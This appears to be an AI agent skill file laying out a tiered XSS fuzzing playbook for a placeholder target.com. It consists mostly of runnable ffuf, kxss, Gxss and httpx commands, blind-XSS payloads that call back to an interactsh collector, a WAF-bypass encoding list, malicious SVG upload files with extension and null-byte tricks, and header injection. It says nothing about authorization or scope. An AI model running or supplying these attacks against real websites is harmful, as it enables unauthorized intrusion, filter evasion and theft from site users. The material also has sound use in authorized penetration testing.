# XSS Fuzzing Strategy — Systematic Payload Delivery

## Fuzzing vs Manual Testing

| Approach | When to Use | Speed | Coverage |
|----------|------------|-------|----------|
| Nuclei DAST | Initial wide scan across all params | Fastest | Broad |
| Dalfox | Per-URL deep scan with WAF bypass | Fast | Deep |
| ffuf | Custom wordlist + payload combos | Fastest | Custom |
| kxss/Gxss | Reflection detection first pass | Fast | Narrow |
| Manual browser | Confirmed reflection, context detection | Slow | Precise |

## Tier 1: Reflection Discovery (What params reflect?)

Before injecting XSS payloads, find which params actually reflect user input.

### Using kxss
```bash
cat fuzz-targets.txt | kxss | tee kxss-all.txt
grep -i "Vulnerable" kxss-all.txt > reflecting-params.txt
```

### Using Gxss
```bash
cat fuzz-targets.txt | Gxss -p XSS -o gxss-out.txt
grep "Reflection" gxss-out.txt | grep -i "found" > reflecting-params.txt
```

### Using httpx
```bash
cat fuzz-targets.txt | httpx -x GET \
  -H "User-Agent: Mozilla/5.0" \
  -sr -srd responses/ 2>/dev/null
grep -rl "PROBE123\|XSS\|test" responses/ | head -20
```

### Using ffuf (bulk reflection check)
```bash
ffuf -u https://target.com/page?FUZZ=REFLECTME \
  -w params.txt:FUZZ \
  -mr "REFLECTME" \
  -t 100 \
  -o reflection.json
```

## Tier 2: Context-Specific Fuzzing

Once reflection is confirmed, fuzz each context with the appropriate payloads.

### HTML Body Context
```bash
ffuf -u "https://target.com/page?param=PAYLOAD" \
  -w /home/chinnuy93/.agents/skills/xss-elite/payloads/html-context.txt:PAYLOAD \
  -mr "alert|confirm|prompt" \
  -t 50 \
  -o html-xss.json
```

### Attribute Context
```bash
ffuf -u "https://target.com/page?param=PAYLOAD" \
  -w /home/chinnuy93/.agents/skills/xss-elite/payloads/attribute-context.txt:PAYLOAD \
  -mr "alert|confirm|prompt" \
  -t 50 \
  -o attr-xss.json
```

### JavaScript Context
```bash
ffuf -u "https://target.com/page?param=PAYLOAD" \
  -w /home/chinnuy93/.agents/skills/xss-elite/payloads/javascript-context.txt:PAYLOAD \
  -mr "alert|confirm|prompt" \
  -t 50 \
  -o js-xss.json
```

### Blind XSS (callback-based)
```bash
# Replace COLLECTOR with your interactsh URL
sed "s/COLLECTOR/YOUR_INTERACTSH/g" /home/chinnuy93/.agents/skills/xss-elite/payloads/blind-xss.txt > blind-payloads.txt

ffuf -u "https://target.com/page?param=PAYLOAD" \
  -w blind-payloads.txt:PAYLOAD \
  -t 50
# Check interactsh dashboard for callbacks
```

## Tier 3: WAF Bypass Fuzzing

If standard payloads get blocked, run the WAF bypass suite.

```bash
# Run all WAF bypass techniques against a confirmed-reflecting param
ffuf -u "https://target.com/page?param=PAYLOAD" \
  -w /home/chinnuy93/.agents/skills/xss-elite/payloads/waf-bypass.txt:PAYLOAD \
  -mr "alert|confirm|prompt|callback" \
  -t 30 \
  -timeout 10 \
  -o waf-bypass.json
```

### WAF Bypass Priority
1. Mixed case → `<ScRiPt>`
2. Comment injection → `<scr<!-->ipt>`
3. Tab/newline → `<scr%09ipt>`
4. Unicode → `\u0073cript`
5. Double URL → `%253Cscript%253E`
6. UTF-7 → `+ADw-script+AD4-`
7. Nested tags → `<script<script>>`
8. Buffer overflow → 8KB padding
9. HPP → split across params
10. Content-Type switch

## Tier 4: Upload Fuzzing

```bash
# Create test SVG files
echo '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>' > /tmp/xss.svg
echo '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' > /tmp/xss2.svg

# Fuzz upload endpoints with multiple extensions
ffuf -u https://target.com/upload \
  -X POST \
  -F "file=@/tmp/xss.svg;filename=FUZZ" \
  -w <(echo -e "xss.svg\nxss.svg.png\nxss.svg;.jpg\nxss.html.svg\nxss.php.svg\nxss.svg%00.jpg\nxss.asp.svg") \
  -t 10
```

## Tier 5: Header Fuzzing

```bash
# Fuzz User-Agent
ffuf -u https://target.com/page \
  -H "User-Agent: FUZZ" \
  -w elite-payloads.txt:FUZZ \
  -mr "alert|confirm"
```

## Indicator-Based Fuzzing (What to Watch For)

| Indicator in Response | Meaning | Action |
|-----------------------|---------|--------|
| Payload appears **unescaped** in HTML | Reflection confirmed | Test with `<img src=x onerror=alert(1)>` |
| `&lt;` instead of `<` | HTML-encoded | Not vulnerable here, check other contexts |
| `\"` instead of `"` | Backslash-escaped | Try `\"` breakout or `</script>` |
| `&#60;` instead of `<` | Entity-encoded | Check for double-encode bypass |
| `400 Bad Request` | WAF/input validation | Try bypass techniques |
| `403 Forbidden` | WAF blocking | Try encoding, case mutation |
| `500 Internal Server Error` | Possible crash or bug | Investigate manually |
| Response time > 5s | Possible SQLi blind | Switch to SQLi testing |
| Payload in `Set-Cookie` | Reflected in cookie | Cookie-based XSS |
| Payload in `Location` header | Redirect reflection | Open redirect + XSS chain |
| Payload in JSON response | Check Content-Type | If `text/html` → XSS; if `application/json` → may need polyglot |

## Fuzzing Wordlists to Include

| Source | URL/Location |
|--------|-------------|
| Payloadbox XSS | `https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt` |
| XSS Elite payloads | `/home/chinnuy93/.agents/skills/xss-elite/payloads/` |
| PortSwigger XSS | `https://portswigger.net/web-security/cross-site-scripting/cheat-sheet` |
| swisskyrepo Payloads | `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection` |
| OWASP XSS Filter Evasion | `https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html` |
